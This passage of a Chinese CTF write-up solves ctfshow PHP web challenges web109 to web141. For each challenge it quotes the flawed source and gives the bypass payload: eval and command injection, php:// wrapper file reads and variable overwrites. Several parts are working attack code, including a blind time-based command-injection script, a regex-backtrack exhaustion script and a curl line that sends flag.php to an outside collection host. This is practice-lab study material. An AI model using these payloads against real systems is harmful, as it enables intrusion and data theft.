ereg(string pattern, string originalstring, [array regs]);函数搜索由指定的字符串作为由模式指定的字符串，如果发现模式则返回true，否则返回false。搜索对于字母字符是区分大小写的。涉及到的问题：%00截断及遇到%00则默认为字符串的结束strrev(string $string): string返回反转后的字符串\n前面intval我们已经学过，默认情况下转换为10进制，对于0x36d，其十进制为877\n即利用00截断来匹配英文，配合后面strrev，我们可以构造a778，翻转后的877a经intval即变为877\nc=a%00778\n\n\n\nweb109. 换个姿势 内置类绕过报错\n\n题面如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-29 22:02:34*/highlight_file(__FILE__);error_reporting(0);if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;    $v1 = $_GET[&#x27;v1&#x27;];    $v2 = $_GET[&#x27;v2&#x27;];    if(preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v1) &amp;&amp; preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v2))&#123;            eval(&quot;echo new $v1($v2());&quot;);    &#125;&#125;?&gt;\nException 处理用于在指定的错误发生时改变脚本的正常流程，是php内置的异常处理类\n因此我们可以利用异常类来让v1不报错，v2去执行系统命令\nv1=Exception&amp;v2=system(&#x27;tac fl36dg.txt&#x27;)\n\n\n\nweb110. 我报警了 FilesystemIterator文件系统迭代器\n\n题面如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-29 22:49:10*/highlight_file(__FILE__);error_reporting(0);if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;    $v1 = $_GET[&#x27;v1&#x27;];    $v2 = $_GET[&#x27;v2&#x27;];    if(preg_match(&#x27;/\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\&#123;|\\[|\\;|\\:|\\&quot;|\\&#x27;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]/&#x27;, $v1))&#123;            die(&quot;error v1&quot;);    &#125;    if(preg_match(&#x27;/\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\&#123;|\\[|\\;|\\:|\\&quot;|\\&#x27;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]/&#x27;, $v2))&#123;            die(&quot;error v2&quot;);    &#125;    eval(&quot;echo new $v1($v2());&quot;);&#125;?&gt;\n困难点1：过滤了() &#39; 导致无法再用system执行命令\n困难点2：由于1的限制无法获取文件名\n可以使用php提供的文件系统迭代器，通过getcwd()获取当前目录下的文件结构\nv1=FilesystemIterator&amp;v2=getcwd\n回显fl36dga.txt，直接访问即可id:: 6334749c-0215-4159-ada8-e36317b3d83f\n\n\n\nweb111. 变量覆盖\n\n题面如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-30 02:41:40*/highlight_file(__FILE__);error_reporting(0);include(&quot;flag.php&quot;);function getFlag(&amp;$v1,&amp;$v2)&#123;    eval(&quot;$$v1 = &amp;$$v2;&quot;);    var_dump($$v1);&#125;if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;    $v1 = $_GET[&#x27;v1&#x27;];    $v2 = $_GET[&#x27;v2&#x27;];    if(preg_match(&#x27;/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\&#123;|\\[|\\;|\\:|\\&quot;|\\&#x27;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\&lt;|\\&gt;/&#x27;, $v1))&#123;            die(&quot;error v1&quot;);    &#125;    if(preg_match(&#x27;/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\&#123;|\\[|\\;|\\:|\\&quot;|\\&#x27;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\&lt;|\\&gt;/&#x27;, $v2))&#123;            die(&quot;error v2&quot;);    &#125;        if(preg_match(&#x27;/ctfshow/&#x27;, $v1))&#123;            getFlag($v1,$v2);    &#125;        &#125;?&gt;\n首先对v1要求必须含有ctfshow，其次在getFlag中会将v2的地址传给v1然后再输出v1\n这里的思路就是v2选择一个数组可供v1来输出，其中还要能包含变量flag\n所以考虑全局数组$GLOBALS：引用全局作用域中可用的全部变量 一个包含了全部变量的全局组合数组。变量的名字就是数组的键。\nv1=ctfshow&amp;v2=GLOBALS\n\n\n\nweb112. 函数绕过\n\n题面如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: Firebasky# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-30 23:47:49*/highlight_file(__FILE__);error_reporting(0);function filter($file)&#123;    if(preg_match(&#x27;/\\.\\.\\/|http|https|data|input|rot13|base64|string/i&#x27;,$file))&#123;        die(&quot;hacker!&quot;);    &#125;else&#123;        return $file;    &#125;&#125;$file=$_GET[&#x27;file&#x27;];if(! is_file($file))&#123;    highlight_file(filter($file));&#125;else&#123;    echo &quot;hacker!&quot;;&#125;\nis_file()如果文件存在且为正常的文件则返回 true，否则返回 false自 PHP 5.0.0 起, 此函数也用于某些 URL 包装器。请参见 支持的协议和封装协议以获得支持 stat() 系列函数功能的包装器列表。\n原来就是利用php伪协议。。。配合高亮文本，连base64都不需要\nfile=php://filter/resource=flag.php\n\n\n\nweb113. 函数绕过\n\n题面如下，多过滤了一个filter关键字\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: Firebasky# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-30 23:47:52*/highlight_file(__FILE__);error_reporting(0);function filter($file)&#123;    if(preg_match(&#x27;/filter|\\.\\.\\/|http|https|data|data|rot13|base64|string/i&#x27;,$file))&#123;        die(&#x27;hacker!&#x27;);    &#125;else&#123;        return $file;    &#125;&#125;$file=$_GET[&#x27;file&#x27;];if(! is_file($file))&#123;    highlight_file(filter($file));&#125;else&#123;    echo &quot;hacker!&quot;;&#125;\n换另一个伪协议zlib://\ncompress.zlib://:zlib: 的功能类似 gzopen()，但是 其数据流还能被 fread() 和其他文件系统函数使用。\nfile=compress.zlib://flag.php\n\n\n\nweb114. 函数绕过\n\n题面如下，多过滤了compress|root|zip|convert 但是filter还在\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: Firebasky# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-10-01 15:02:53*/error_reporting(0);highlight_file(__FILE__);function filter($file)&#123;    if(preg_match(&#x27;/compress|root|zip|convert|\\.\\.\\/|http|https|data|data|rot13|base64|string/i&#x27;,$file))&#123;        die(&#x27;hacker!&#x27;);    &#125;else&#123;        return $file;    &#125;&#125;$file=$_GET[&#x27;file&#x27;];echo &quot;师傅们居然tql都是非预期 哼！&quot;;if(! is_file($file))&#123;    highlight_file(filter($file));&#125;else&#123;    echo &quot;hacker!&quot;;&#125; 师傅们居然tql都是非预期 哼！\n依旧是使用最经典的伪协议即可\n\n\n\nweb115. 函数绕过\n\n题面如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: Firebasky# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-10-01 15:08:19*/include(&#x27;flag.php&#x27;);highlight_file(__FILE__);error_reporting(0);function filter($num)&#123;    $num=str_replace(&quot;0x&quot;,&quot;1&quot;,$num);    $num=str_replace(&quot;0&quot;,&quot;1&quot;,$num);    $num=str_replace(&quot;.&quot;,&quot;1&quot;,$num);    $num=str_replace(&quot;e&quot;,&quot;1&quot;,$num);    $num=str_replace(&quot;+&quot;,&quot;1&quot;,$num);    return $num;&#125;$num=$_GET[&#x27;num&#x27;];if(is_numeric($num) and $num!==&#x27;36&#x27; and trim($num)!==&#x27;36&#x27; and filter($num)==&#x27;36&#x27;)&#123;    if($num==&#x27;36&#x27;)&#123;        echo $flag;    &#125;else&#123;        echo &quot;hacker!!&quot;;    &#125;&#125;else&#123;    echo &quot;hacker!!!&quot;;&#125; hacker!!!\nfilter函数限制了使用八进制或者十六进制绕过，且还有一个trim函数的限制\n后面比较时用的是弱类型\n写脚本跑一下哪些字符可以绕过if\n&lt;?phpfor ($i=0;$i &lt;= 128; $i++)&#123;    $a = chr($i).&#x27;36&#x27;;    if(trim($a) !==&#x27;36&#x27; &amp;&amp; is_numeric($a))&#123;        echo urlencode(chr($i)).&quot;\\n&quot;;    &#125;&#125;\n{:height 496, :width 355}\nnum=%0c36\n\n\n\nweb123. 突破函数禁用 post get传参 变量名特性\n\n题面如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: Firebasky# @Date:   2020-09-05 20:49:30# @Last Modified by:   h1xa# @Last Modified time: 2020-09-07 22:02:47# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);$a=$_SERVER[&#x27;argv&#x27;];$c=$_POST[&#x27;fun&#x27;];if(isset($_POST[&#x27;CTF_SHOW&#x27;])&amp;&amp;isset($_POST[&#x27;CTF_SHOW.COM&#x27;])&amp;&amp;!isset($_GET[&#x27;fl0g&#x27;]))&#123;    if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\&#123;|\\&#125;|\\&quot;|\\&#x27;|\\,|\\.|\\;|\\?/&quot;, $c)&amp;&amp;$c&lt;=18)&#123;         eval(&quot;$c&quot;.&quot;;&quot;);           if($fl0g===&quot;flag_give_me&quot;)&#123;             echo $flag;         &#125;    &#125;&#125;?&gt;\nif语句过程体中存在eval代码执行，可以直接echo出flag.php的变量\n需要考虑设置好post参数CTF_SHOW/CTF_SHOW.COM\n特性1：被get或者post传入的变量名，如果含有 空格、+、[ 则会被转化为 _\n特性2：就是如果传入 [ ，它被转化为 _ 之后，后面的字符就会被保留下来不会被替换\nCTF[SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=echo $flag\n\n\n\nweb125. php特性\n\n题面如下，多加了一些关键词限制 无法使用echo了\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: Firebasky# @Date:   2020-09-05 20:49:30# @Last Modified by:   h1xa# @Last Modified time: 2020-09-07 22:02:47##*/error_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);$a=$_SERVER[&#x27;argv&#x27;];$c=$_POST[&#x27;fun&#x27;];if(isset($_POST[&#x27;CTF_SHOW&#x27;])&amp;&amp;isset($_POST[&#x27;CTF_SHOW.COM&#x27;])&amp;&amp;!isset($_GET[&#x27;fl0g&#x27;]))&#123;    if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\&#123;|\\&#125;|\\&quot;|\\&#x27;|\\,|\\.|\\;|\\?|flag|GLOBALS|echo|var_dump|print/i&quot;, $c)&amp;&amp;$c&lt;=16)&#123;         eval(&quot;$c&quot;.&quot;;&quot;);         if($fl0g===&quot;flag_give_me&quot;)&#123;             echo $flag;         &#125;    &#125;&#125;?&gt;\n这里构造的也比较巧妙，首先我们可以直接读文件，利用highlight_file\n其次由于flag关键字被ban，所以可以通过引入get传参的方式来绕过正则匹配\nCTF[SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=highlight_file($_GET[1])GET: 1=flag.php\n\n\n\nweb126. php特性 $_SERVER\n\n题面如下，还按照单个字符进行了过滤。。。\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: Firebasky# @Date:   2020-09-05 20:49:30# @Last Modified by:   h1xa# @Last Modified time: 2020-09-07 22:02:47##*/error_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);$a=$_SERVER[&#x27;argv&#x27;];$c=$_POST[&#x27;fun&#x27;];if(isset($_POST[&#x27;CTF_SHOW&#x27;])&amp;&amp;isset($_POST[&#x27;CTF_SHOW.COM&#x27;])&amp;&amp;!isset($_GET[&#x27;fl0g&#x27;]))&#123;    if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\&#123;|\\&#125;|\\&quot;|\\&#x27;|\\,|\\.|\\;|\\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i&quot;, $c) &amp;&amp; strlen($c)&lt;=16)&#123;         eval(&quot;$c&quot;.&quot;;&quot;);           if($fl0g===&quot;flag_give_me&quot;)&#123;             echo $flag;         &#125;    &#125;&#125;\n还能利用的有eval \n这里用到了$_SERVER[&#39;argv&#39;]\n\n也就是GET传参，会在该数组中留下一个键值对形式的查询参数\n所以可以通过server传入代码，然后通过$c实现命令执行\n构造恶意代码，利用$fl0gGET: $fl0g=flag_give_me;POST:CTF[SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=eval($a[0])\n\n\n\nweb127. php特性\n\n题面如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-10-10 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-10-10 21:52:49*/error_reporting(0);include(&quot;flag.php&quot;);highlight_file(__FILE__);$ctf_show = md5($flag);$url = $_SERVER[&#x27;QUERY_STRING&#x27;];//特殊字符检测function waf($url)&#123;    if(preg_match(&#x27;/\\`|\\~|\\!|\\@|\\#|\\^|\\*|\\(|\\)|\\\\$|\\_|\\-|\\+|\\&#123;|\\;|\\:|\\[|\\]|\\&#125;|\\&#x27;|\\&quot;|\\&lt;|\\,|\\&gt;|\\.|\\\\\\|\\//&#x27;, $url))&#123;        return true;    &#125;else&#123;        return false;    &#125;&#125;if(waf($url))&#123;    die(&quot;嗯哼？&quot;);&#125;else&#123;    extract($_GET);&#125;if($ctf_show===&#x27;ilove36d&#x27;)&#123;    echo $flag;&#125;\nQUERY_STRING: query string（查询字符串），如果有的话，通过它进行页面访问\nextract(array &amp;$array, int $flags = EXTR_OVERWRITE, string $prefix = &quot;&quot;): int本函数用来将变量从数组中导入到当前的符号表中。检查每个键名看是否可以作为一个合法的变量名，同时也检查和符号表中已有的变量名的冲突如果有冲突，覆盖已有的变量。\n直接覆盖即可，对于变量名ctf_show，_用空格进行替换\nctf%20show=ilove36d\n\n\n\nweb128. 骚操作 gettext拓展\n\n题面如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-10-10 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-10-12 19:49:05*/error_reporting(0);include(&quot;flag.php&quot;);highlight_file(__FILE__);$f1 = $_GET[&#x27;f1&#x27;];$f2 = $_GET[&#x27;f2&#x27;];if(check($f1))&#123;    var_dump(call_user_func(call_user_func($f1,$f2)));&#125;else&#123;    echo &quot;嗯哼？&quot;;&#125;function check($str)&#123;    return !preg_match(&#x27;/[0-9]|[a-z]/i&#x27;, $str);&#125; NULL\ncheck中过滤了字母和数字，使得回调函数不能为数字或字母\ncall_user_func:  把第一个参数作为回调函数，其余参数都是回调函数的参数\n这里利用了gettext拓展\n\n也就是gettext()等价于_()\nReturns a translated string if one is found in the translation table, or the submitted message if not found\n所以可以当作 echo 来使用\n所以第一层可以回显一个变量或者类似全局变量函数出来，利用第二层的call_user_func来执行或查看\n这里需要利用get_defined_vars\nget_defined_vars ( void ) : array 函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。\nf1=_&amp;f2=get_defined_vars\n\n\n\nweb129. 常规操作\n\n题面如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-10-13 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-10-13 03:18:40*/error_reporting(0);highlight_file(__FILE__);if(isset($_GET[&#x27;f&#x27;]))&#123;    $f = $_GET[&#x27;f&#x27;];    if(stripos($f, &#x27;ctfshow&#x27;)&gt;0)&#123;        echo readfile($f);    &#125;&#125;\n关注stripos\n读取函数的参数中必须包含ctfshow\n这里可以试一下远程文件包含，不过好像必须以文件形式返回的php内容才会被解析\n?f=http://url/xxxx.txt?ctfshow\n也可以用php伪协议，因为过滤器支持自定义，我们可以胡写一个上去\n?f=php://filter/read=convert.base64-encode|ctfshow/resource=flag.php\n\n\n\nweb130.   very very very（省略25万个very）ctfshow 正则最大回溯\n\n题面如下，preg_match中s模式下可匹配换行符\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-10-13 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-10-13 05:19:40*/error_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);if(isset($_POST[&#x27;f&#x27;]))&#123;    $f = $_POST[&#x27;f&#x27;];    if(preg_match(&#x27;/.+?ctfshow/is&#x27;, $f))&#123;        die(&#x27;bye!&#x27;);    &#125;    if(stripos($f, &#x27;ctfshow&#x27;) === FALSE)&#123;        die(&#x27;bye!!&#x27;);    &#125;    echo $flag;&#125;\nstripos对大小写不敏感\nPHP 为了防止正则表达式的拒绝服务攻击（reDOS），给 pcre 设定了一个回溯次数上限 pcre.backtrack_limit回溯次数上限默认是 100 万。如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false\n非预期：直接传参ctfshow，正则由于前面没匹配到字符，所以返回False；后面定位子串时返回位置0，由于强类型比较导致也不满足条件\n预期：正则最大回溯，也就是只要能疯狂回溯就可。也就是使得前面非贪婪模式匹配到的字符达到上限\n#coding=gbkimport requestsurl = &quot;http://f314e484-452e-4810-a89e-e96ef16748df.challenge.ctf.show/&quot;data = &#123;    &#x27;f&#x27;: &quot;dotast&quot;* 170000 + &#x27;ctfshow&#x27;&#125;r = requests.post(url, data=data)print(r.text)\n\n\n\nweb131. very very very（省略25万个very）ctfshow\n\n题面如下，这回直接打的非预期已经没了，因为.+?已经可以匹配到前缀\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-10-13 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-10-13 05:19:40*/error_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);if(isset($_POST[&#x27;f&#x27;]))&#123;    $f = (String)$_POST[&#x27;f&#x27;];    if(preg_match(&#x27;/.+?ctfshow/is&#x27;, $f))&#123;        die(&#x27;bye!&#x27;);    &#125;    if(stripos($f,&#x27;36Dctfshow&#x27;) === FALSE)&#123;        die(&#x27;bye!!&#x27;);    &#125;    echo $flag;&#125;\n还是上一关的正则ddos直接打到正则回溯上限\n\n\n\nweb132. 为什么会这样？ 信息泄漏&amp;&amp;优先级问题\n\n题面成了一个模版网站\n\n常规从robots.txt中找，/admin返回了题面…. 花里胡哨\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-10-13 06:22:13# @Last Modified by:   h1xa# @Last Modified time: 2020-10-13 20:05:36# @email: h1xa@ctfer.com# @link: https://ctfer.com*/#error_reporting(0);include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;username&#x27;]) &amp;&amp; isset($_GET[&#x27;password&#x27;]) &amp;&amp; isset($_GET[&#x27;code&#x27;]))&#123;    $username = (String)$_GET[&#x27;username&#x27;];    $password = (String)$_GET[&#x27;password&#x27;];    $code = (String)$_GET[&#x27;code&#x27;];    if($code === mt_rand(1,0x36D) &amp;&amp; $password === $flag || $username ===&quot;admin&quot;)&#123;                if($code == &#x27;admin&#x27;)&#123;            echo $flag;        &#125;            &#125;&#125;\nmt_rand(int $min, int $max): int 生成更好的随机数\n这里其实有个优先级绕过问题，即在不加括号的情况下，||优先级是低于&amp;&amp;的\n所以会导致前面俩比较返回true，后面返回true，然后直接就绕过了，并且参数全部可控\ncode=admin&amp;username=admin&amp;password=1\n\n\n\nweb133. 为什么会这样 curl外带\n\n还是直接给了题面\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: Firebasky# @Date:   2020-10-13 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-10-13 16:43:44*/error_reporting(0);highlight_file(__FILE__);//flag.phpif($F = @$_GET[&#x27;F&#x27;])&#123;    if(!preg_match(&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;, $F))&#123;        eval(substr($F,0,6));    &#125;else&#123;        die(&quot;6个字母都还不够呀?!&quot;);    &#125;&#125;\nban了几个命令执行函数，并且限制了输入长度\n首先，直面来看我们能利用的命令执行函数只有``，但是没有回显。其次长度有限，但是我们知道传参变量为$F\n我们传递?F=`$F`;+sleep 3好像网站确实sleep了一会说明的确执行了命令那为什么会这样？因为是我们传递的`$F`;+sleep 3。先进行substr()函数截断然后去执行eval()函数而$F就是我们输入的`$F`;+sleep 3 使用最后执行的代码应该是``$F`;+sleep 3`,就执行成功\n所以接下来就是带出回显数据\n可以利用curl命令向制定网站发送文件数据\n这里借用burp的Collaborator client进行数据的外带\npayload:?F=`$F`;+curl -X POST -F xx=@flag.php http://bapltp9pue295xitue0e4pwm1d73vs.burpcollaborator.net\n{:height 449, :width 602}\n\n\n\nweb134. 为什么会那样 parse_str 变量覆盖\n\n题面如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: Firebasky# @Date:   2020-10-13 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-10-14 23:01:06*/highlight_file(__FILE__);$key1 = 0;$key2 = 0;if(isset($_GET[&#x27;key1&#x27;]) || isset($_GET[&#x27;key2&#x27;]) || isset($_POST[&#x27;key1&#x27;]) || isset($_POST[&#x27;key2&#x27;])) &#123;    die(&quot;nonononono&quot;);&#125;@parse_str($_SERVER[&#x27;QUERY_STRING&#x27;]);extract($_POST);if($key1 == &#x27;36d&#x27; &amp;&amp; $key2 == &#x27;36d&#x27;) &#123;    die(file_get_contents(&#x27;flag.php&#x27;));&#125;\nparse_str(string $string, array &amp;$result): void如果 string 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域（如果提供了 result 则会设置到该数组里 ）极度不建议在没有 result 参数的情况下使用此函数， 并且在 PHP 7.2 中将废弃不设置参数的行为。PHP 8.0.0 起，result 参数是强制的。\n对于parse_str()，如果传入的是一个数组，例如arr[]=1，则会将变量保存在数组当中arr[0]=1;\n而extract又能将数组中的键值对放入符号表。因此直接传数组即可绕过参数限制\nextract的入参点为$_POST变量，因此\n?_POST[key1]=36d&amp;_POST[key2]=36d\n\n\n\nweb135. web133plus\n\n题面如下，这次把curl给ban了，而且限制了更多的命令执行函数\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: Firebasky# @Date:   2020-10-13 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-10-16 18:48:03*/error_reporting(0);highlight_file(__FILE__);//flag.phpif($F = @$_GET[&#x27;F&#x27;])&#123;    if(!preg_match(&#x27;/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i&#x27;, $F))&#123;        eval(substr($F,0,6));    &#125;else&#123;        die(&quot;师傅们居然破解了前面的，那就来一个加强版吧&quot;);    &#125;&#125;\ncp命令没有被ban。。。这确实想不到\n?F=`$F`;+cp flag.php 1.txt\n\n\n\nweb136.\n\n题面如下\n&lt;?phperror_reporting(0);function check($x)&#123;    if(preg_match(&#x27;/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&amp;|\\*|\\?|\\&#123;|\\&#125;|\\&gt;|\\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;, $x))&#123;        die(&#x27;too young too simple sometimes naive!&#x27;);    &#125;&#125;if(isset($_GET[&#x27;c&#x27;]))&#123;    $c=$_GET[&#x27;c&#x27;];    check($c);    exec($c);&#125;else&#123;    highlight_file(__FILE__);&#125;?&gt;\nexec是仅回显最后一行需要结合echo的，所以这里一般是输出到另外一个文件 cp被ban了，但是还有tee\n\nteetee a.txt b.txt，将a.txt复制到b.txtls | tee b.txt,将ls命令的执行结果写入b.txt\n管道符没有被ban， 接下来是考虑文件名的问题\n先扫一下目录，当前目录只有一个index.php，看下根目录\nls /| tee racerz出现文件 f149_15_h3r3\n然后读就完了\ntac /f149_15_h3r3 | tee racerz\n\n\n\nweb137. 没有难度\n\n题面如下，有个静态方法在类ctfshow中，限制了不能去new，直接::调用即可\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-10-13 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-10-16 22:27:49*/error_reporting(0);highlight_file(__FILE__);class ctfshow&#123;    function __wakeup()&#123;        die(&quot;private class&quot;);    &#125;    static function getFlag()&#123;        echo file_get_contents(&quot;flag.php&quot;);    &#125;&#125;call_user_func($_POST[&#x27;ctfshow&#x27;]);\nctfshow=ctfshow::getFlag\n\n\n\nweb138. 一丢丢难度\n\n题面如下，这关把命名作用符给ban了\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-10-13 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-10-16 22:52:13*/error_reporting(0);highlight_file(__FILE__);class ctfshow&#123;    function __wakeup()&#123;        die(&quot;private class&quot;);    &#125;    static function getFlag()&#123;        echo file_get_contents(&quot;flag.php&quot;);    &#125;&#125;if(strripos($_POST[&#x27;ctfshow&#x27;], &quot;:&quot;)&gt;-1)&#123;    die(&quot;private function&quot;);&#125;call_user_func($_POST[&#x27;ctfshow&#x27;]);\ncall_user_func还支持传数组的方式去调用类方法，不过注意不是键值对的方式，而是数组内元素的方式传递\n{:height 309, :width 397}\nctfshow[0]=ctfshow&amp;ctfshow[1]=getFlag\n\n\n\nweb139. 没变化吗 shell编程和盲注\n\n题面如下\n&lt;?phperror_reporting(0);function check($x)&#123;    if(preg_match(&#x27;/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&amp;|\\*|\\?|\\&#123;|\\&#125;|\\&gt;|\\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;, $x))&#123;        die(&#x27;too young too simple sometimes naive!&#x27;);    &#125;&#125;if(isset($_GET[&#x27;c&#x27;]))&#123;    $c=$_GET[&#x27;c&#x27;];    check($c);    exec($c);&#125;else&#123;    highlight_file(__FILE__);&#125;?&gt;\n这关把cp给ban了\n这关已经没有了写入权限，并且访问任意路由都会回显当前页面…\n截取字符串可以用awk等命令，cut可以分割字符判断命令执行结果可以用shell编程的if语句和sleep()函数\nawkNR                 已读的记录数cut -c  \t仅显示行中指定范围的字符结合shell编程if\tif [ command ]; then     \t符合该条件执行的语句\tfisleep构造if [`ls / | awk NR=? | cut -c ?` == ?]; then sleep 2;fi\n#coding=gbkimport requestsurl = &quot;http://ef27492e-3306-46a8-b9bd-2c76841396c4.challenge.ctf.show/&quot;result = &quot;&quot;for i in range(1, 5):    for j in range(1, 15):        for k in range(32, 128):            k = chr(k)            payload = &quot;?c=&quot; + f&quot;if [`ls / | awk NR==&#123;i&#125; | cut -c &#123;j&#125;` == &#123;k&#125;]; then sleep 2;fi&quot;            try:                r = requests.get(url=url+payload, timeout=1.8)            except:                result += k                print(result)                break\n\n\n\nweb140. 没有难度\n\n题面如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-10-13 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-10-17 12:39:25*/error_reporting(0);highlight_file(__FILE__);if(isset($_POST[&#x27;f1&#x27;]) &amp;&amp; isset($_POST[&#x27;f2&#x27;]))&#123;    $f1 = (String)$_POST[&#x27;f1&#x27;];    $f2 = (String)$_POST[&#x27;f2&#x27;];    if(preg_match(&#x27;/^[a-z0-9]+$/&#x27;, $f1))&#123;        if(preg_match(&#x27;/^[a-z0-9]+$/&#x27;, $f2))&#123;            $code = eval(&quot;return $f1($f2());&quot;);            if(intval($code) == &#x27;ctfshow&#x27;)&#123;                echo file_get_contents(&quot;flag.php&quot;);            &#125;        &#125;    &#125;&#125;\n传参变量限制内容为字母数字，并且拼接形成一个方法执行后的返回值赋值给code，code判断经intval后的整数值是否等于0（因为这里是一个弱比较）。因此左面也只要是一个非数字字符串即可，哈希函数就可以满足要求\nPOST:f1=md5&amp;f2=md5\n\n\n\nweb141. 难度无  无字母数字的webshell\n\n题面如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-10-13 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-10-17 19:28:09*/#error_reporting(0);highlight_file(__FILE__);if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123;    $v1 = (String)$_GET[&#x27;v1&#x27;];    $v2 = (String)$_GET[&#x27;v2&#x27;];    $v3 = (String)$_GET[&#x27;v3&#x27;];    if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;        if(preg_match(&#x27;/^\\W+$/&#x27;, $v3))&#123;            $code =  eval(&quot;return $v1$v3$v2;&quot;);            echo &quot;$v1$v3$v2 = &quot;.$code;        &#125;    &#125;&#125;\nv1和v2限制了只能为数字，而v3被限制了只能为非数字字母以及下划线的字符串，三个组合拼接执行代码并赋值给code，后面输出\n关于无数字字母的webshell 